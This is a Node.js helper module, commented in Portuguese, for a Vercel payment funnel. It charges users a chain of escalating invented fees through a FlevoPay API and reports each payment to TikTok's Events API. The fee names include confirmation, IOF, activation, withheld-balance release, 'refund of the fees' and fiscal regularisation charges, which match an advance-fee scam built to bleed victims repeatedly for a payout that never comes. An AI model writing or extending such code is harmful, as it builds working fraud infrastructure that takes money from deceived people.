// Código compartilhado pelos endpoints. O "_" no nome impede a Vercel de expor este arquivo como rota.
const crypto = require("crypto");

const FLEVO_BASE = "https://pagamento-processador.org.ua/api/v1";
const TIKTOK_EVENTS = "https://business-api.tiktok.com/open_api/v1.3/event/track/";

// Preço (em centavos), nome e próxima etapa de cada passo do funil.
// `next` só é usado pelo up8, up9 e up10 (o servidor devolve o link de redirecionamento).
// As demais etapas seguem o `proximo` que já está no checkout.html de cada pasta.
const STEPS = {
  front: { amount: 2091, name: "Taxa de Confirmação" },
  back: { amount: 1244, name: "Taxa de Confirmação - Desconto Aplicado" },
  up1: { amount: 2334, name: "Taxa de IOF" },
  up2: { amount: 2631, name: "Taxa Única de Ativação" },
  up3: { amount: 2435, name: "Taxa de Antecipação" },
  up4: { amount: 2142, name: "Taxa de Atualização da Vaga" },
  up5: { amount: 3274, name: "Guia de Recolhimento Única" },
  up6: { amount: 3893, name: "Taxa de Liberação de Saldo Retido" },
  up7: { amount: 2442, name: "Estorno das Taxas - Sistema de Devolução Total" },
  up8: { amount: 1946, name: "Bônus Extra - TikTok Premium", next: "/up9/index.html" },
  up9: { amount: 1473, name: "Antecipação de Saque", next: "/up10/index.html" },
  up10: { amount: 2335, name: "Guia de Regularização Fiscal", next: "/obrigado/index.html" },
};

function env(nome) {
  return (process.env[nome] || "").trim();
}

function sha256(valor) {
  return crypto.createHash("sha256").update(String(valor).trim().toLowerCase()).digest("hex");
}

function soDigitos(v) {
  return String(v || "").replace(/\D/g, "");
}

// CPF/CNPJ pelo dígito verificador (a FlevoPay pede só números).
function cpfValido(valor) {
  const c = soDigitos(valor);
  if (c.length !== 11 || /^(\d)\1{10}$/.test(c)) return false;
  for (let volta = 9; volta < 11; volta++) {
    let soma = 0;
    for (let i = 0; i < volta; i++) soma += Number(c[i]) * (volta + 1 - i);
    let digito = (soma * 10) % 11;
    if (digito === 10) digito = 0;
    if (digito !== Number(c[volta])) return false;
  }
  return true;
}

// Telefone com DDD, só números: 10 (fixo) ou 11 dígitos (celular), DDD de 11 a 99.
function telefoneValido(valor) {
  const t = soDigitos(valor);
  return (t.length === 10 || t.length === 11) && Number(t.slice(0, 2)) >= 11;
}

function reais(centavos) {
  return "R$ " + (centavos / 100).toFixed(2).replace(".", ",");
}

function ipDoCliente(req) {
  const xff = String(req.headers["x-forwarded-for"] || "");
  return xff.split(",")[0].trim() || req.socket?.remoteAddress || "";
}

function lerCookie(req, nome) {
  const m = String(req.headers.cookie || "").match(new RegExp("(?:^|;\\s*)" + nome + "=([^;]*)"));
  return m ? decodeURIComponent(m[1]) : "";
}

// Query string da página do lead (UTMs, ttclid...). Vem no corpo ou, na falta, do Referer.
function queryDaPagina(req, bruto) {
  let q = String(bruto || "").replace(/^\?/, "");
  if (!q && req.headers.referer) {
    try { q = new URL(req.headers.referer).search.replace(/^\?/, ""); } catch (e) { /* ignora */ }
  }
  return new URLSearchParams(q);
}

async function lerCorpo(req) {
  if (req.body && typeof req.body === "object") return req.body;
  if (typeof req.body === "string" && req.body) {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return {};
}

async function flevo(caminho, opcoes = {}) {
  const chave = env("FLEVOPAY_SECRET");
  if (!chave) throw new Error("FLEVOPAY_SECRET não configurada");
  const r = await fetch(FLEVO_BASE + caminho, {
    ...opcoes,
    headers: { "X-API-Key": chave, "Content-Type": "application/json", ...(opcoes.headers || {}) },
  });
  let dados = null;
  try { dados = await r.json(); } catch (e) { /* resposta sem JSON */ }
  return { ok: r.ok, status: r.status, dados };
}

// A FlevoPay não assina o webhook. Cada cobrança leva um token HMAC (feito com a chave secreta e a
// referência) no próprio postback_url; só quem conhece a chave consegue gerar um token válido.
function tokenDoWebhook(reference) {
  return crypto.createHmac("sha256", env("FLEVOPAY_SECRET")).update(String(reference)).digest("hex").slice(0, 32);
}

function tokenValido(reference, recebido) {
  const esperado = Buffer.from(tokenDoWebhook(reference));
  const dado = Buffer.from(String(recebido || ""));
  return esperado.length === dado.length && crypto.timingSafeEqual(esperado, dado);
}

// Endereço público do site (SITE_URL, ou o host da requisição), usado no postback_url.
function urlBase(req) {
  const fixo = env("SITE_URL").replace(/\/+$/, "");
  if (fixo) return fixo;
  const host = String(req.headers["x-forwarded-host"] || req.headers.host || "").split(",")[0].trim();
  return host ? "https://" + host : "";
}

// Etapa do funil a partir da referência ("up3-1712345678901-ab12cd" -> "up3").
function etapaDaReferencia(reference) {
  const etapa = String(reference || "").split("-")[0];
  return Object.prototype.hasOwnProperty.call(STEPS, etapa) ? etapa : "";
}

// Busca a transação pela referência, direto na FlevoPay. É a fonte da verdade do webhook.
async function transacaoPorReferencia(reference) {
  const r = await flevo("/query?action=list_transactions&external_id=" + encodeURIComponent(reference));
  if (!r.ok || !Array.isArray(r.dados)) throw new Error("FlevoPay respondeu " + r.status + " na consulta por referência");
  return r.dados.find((t) => t && t.external_id === reference) || null;
}

// Evento de compra pela Events API do TikTok (servidor -> TikTok).
// event_id fixo por transação (a referência): se o evento for reenviado, o TikTok descarta a duplicata.
// `contexto` substitui o que normalmente vem da requisição do cliente, no caso do webhook,
// que chega da FlevoPay e não do navegador: { ip, userAgent, ttclid, ttp, url }.
async function enviarCompraTikTok({ req, codigo, step, valorCentavos, email, telefone, query, contexto }) {
  const pixel = env("TIKTOK_PIXEL_ID");
  const token = env("TIKTOK_ACCESS_TOKEN");
  if (!pixel || !token) return;

  const ctx = contexto || {};
  const user = {};
  const ip = ctx.ip || (contexto ? "" : ipDoCliente(req));
  const ua = ctx.userAgent || (contexto ? "" : String(req.headers["user-agent"] || ""));
  if (ip) user.ip = ip;
  if (ua) user.user_agent = ua;
  if (email) user.email = sha256(email);
  const fone = soDigitos(telefone);
  if (fone) user.phone = sha256("+" + (fone.startsWith("55") ? fone : "55" + fone));
  user.external_id = sha256(codigo);
  const ttclid = ctx.ttclid || (query && query.get("ttclid"));
  if (ttclid) user.ttclid = ttclid;
  const ttp = ctx.ttp || (contexto ? "" : lerCookie(req, "_ttp"));
  if (ttp) user.ttp = ttp;

  const corpo = {
    event_source: "web",
    event_source_id: pixel,
    data: [{
      event: "Purchase",
      event_time: Math.floor(Date.now() / 1000),
      event_id: "purchase_" + codigo,
      user,
      properties: {
        currency: "BRL",
        value: valorCentavos / 100,
        content_type: "product",
        contents: [{ content_id: step, content_name: STEPS[step].name, quantity: 1, price: valorCentavos / 100 }],
      },
      page: { url: ctx.url || (contexto ? "" : req.headers.referer || ""), referrer: "" },
    }],
  };

  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 4000);
  try {
    await fetch(TIKTOK_EVENTS, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Access-Token": token },
      body: JSON.stringify(corpo),
      signal: ctl.signal,
    });
  } catch (e) {
    /* medição nunca pode atrapalhar a confirmação da venda */
  } finally {
    clearTimeout(timer);
  }
}

module.exports = {
  STEPS, env, soDigitos, cpfValido, telefoneValido, reais, lerCookie, queryDaPagina, lerCorpo, flevo,
  tokenDoWebhook, tokenValido, urlBase, etapaDaReferencia, transacaoPorReferencia, enviarCompraTikTok,
};
